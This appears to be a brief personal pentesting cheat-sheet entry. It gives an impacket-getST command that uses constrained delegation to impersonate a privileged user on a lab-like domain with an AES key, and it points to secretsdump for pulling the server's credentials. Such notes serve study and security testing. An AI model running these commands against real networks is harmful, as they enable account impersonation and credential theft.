---
tags:
  - security
---
```
impacket-getST -spn user/COMPUTER1.catbird.local -impersonate 'privuser' 'catbird.local/SPNCOMPUTER' -aesKey 2b16....b41b
```
- You can get credentials for server with [[impacket secretsdump|impacket-secretsdump]]